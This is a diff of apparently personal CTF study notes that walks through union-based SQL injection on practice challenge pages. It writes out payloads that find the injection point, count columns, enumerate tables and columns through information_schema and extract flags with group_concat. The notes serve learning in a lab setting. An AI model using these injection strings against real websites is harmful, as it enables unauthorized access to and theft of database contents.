@@ -78,6 +78,7 @@ over%' union select 1, id, pass, 4 from member
 1. Review Union SQL Injection (HTTP://ctf.segfaulthub.com:1020/sqlInjection3.php)
 
 2. dol dol data (only one result) (HTTP://ctf.segfaulthub.com:1020/sqlInjection_2_1.php)<br>
+
 a. Find out the point of the SQL Injection
 ```javascript
 1234' or '1' ='1
@@ -108,28 +109,79 @@ g. Find Data
 ```
 
 3. CTF questions<br>
-a. SQL Injection 1
-* Find out the point of the SQL Injection = ad%' and 1=1 #
-* Find out the number of columns = ad%' order by 4 #
-* Find out the number of print column locations = ad%' union select 1,2,3,4 #
-* Find DB name = ad%' union select database(),2,3,4 #  => 	sqli_1
-* Find table name = ad%' union select table_name,2,3,4 from information_schema.tables where table_schema = 'sqli_1' #
-* Find column name = ad%' union select column_name,2,3,4 from information_schema.columns where table_name = 'flag_table' #
-* Find data = ad%' union select flag, 2, 3, 4 from flag_table #
+* SQL Injection 1
+a. Find out the point of the SQL Injection
+```javascript
+ad%' and 1=1 #
+```
+b. Find out the number of columns
+```javascript
+ad%' order by 4 #
+```
+C. Find out the number of print column locations
+```javascript
+ad%' union select 1,2,3,4 #
+```
+d. Find DB name
+```javascript
+ad%' union select database(),2,3,4 #  => 	sqli_1
+```
+e. Find table name
+```javascript
+ad%' union select table_name,2,3,4 from information_schema.tables where table_schema = 'sqli_1' #
+```
+f. Find column name
+```javascript
+ad%' union select column_name,2,3,4 from information_schema.columns where table_name = 'flag_table' #
+```
+g. Find data
+```javascript
+ad%' union select flag, 2, 3, 4 from flag_table #
+```
 
-b. SQL Injection 
-* The point? = When I typed nomaltic, the information showed "My name is normaltic", but when I typed "admin", it doesn't show anything. Which means, depending on the name, the information changes. So, when it tried SQL injection "admin' or '1", it showed "my name is normaltic"
-* The number of columns? = admin' order by 6 #
-* location? = admin' union select 1,2,3,4,5,6 #   => only showing "6"
-* database? = admin' union select 1,2,3,4,5,database() #    => sqli_5
-* table? = admin' union select 1,2,3,4,5,table_name from information_schema.tables where table_schema = 'sqli_5' #     => flag_honey
-* column name? = admin' union select 1,2,3,4,5,column_name from information_schema.columns where table_name = 'flag_honey' #   => flag
-* data? = admin' union select 1,2,3,4,5,flag from flag_honey #    => 	kkkkkkk_Not Here!
-* admin' union SELECT 1, 2, 3, 4, 5, group_concat(table_name) from information_schema.tables where table_schema = 'sqli_5' #
-  - Find hidden information (https://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php)
-* admin' union select 1,2,3,4,5,column_name from information_schema.columns where table_name = 'secret' #
-* admin' union select 1,2,3,4,5,flag from secret #    => NONONO~~~~
-* admin' union select 1,2,3,4,5,group_concat(flag) from secret #
+*. SQL Injection 
+a. The point? = When I typed nomaltic, the information showed "My name is normaltic", but when I typed "admin", it doesn't show anything. Which means, depending on the name, the information changes. So, when it tried SQL injection "admin' or '1", it showed "my name is normaltic"
+b. The number of columns?
+```javascript
+admin' order by 6 #
+```
+c. location?
+```javascript
+admin' union select 1,2,3,4,5,6 #   => only showing "6"
+```
+d. database?
+```javascript
+admin' union select 1,2,3,4,5,database() #    => sqli_5
+```
+e. table? = flag_honey
+```javascript
+admin' union select 1,2,3,4,5,table_name from information_schema.tables where table_schema = 'sqli_5' #     
+```
+f. column name? = flag
+```javascript
+admin' union select 1,2,3,4,5,column_name from information_schema.columns where table_name = 'flag_honey' #
+```
+g. data? = kkkkkkk_Not Here!
+```javascript
+admin' union select 1,2,3,4,5,flag from flag_honey #
+```
+h. other data?
+```javascript
+admin' union SELECT 1, 2, 3, 4, 5, group_concat(table_name) from information_schema.tables where table_schema = 'sqli_5' #
+```
+- [Find hidden information](https://www.w3resource.com/mysql/aggregate-functions-and-grouping/aggregate-functions-and-grouping-group_concat.php)
+i. other data?
+```javascript
+admin' union select 1,2,3,4,5,column_name from information_schema.columns where table_name = 'secret' #
+```
+j. other data?
+```javascript
+admin' union select 1,2,3,4,5,flag from secret #    => NONONO~~~~
+```
+k. other data?
+```javascript
+admin' union select 1,2,3,4,5,group_concat(flag) from secret #
+```
 
 4. Web development
 - mypage
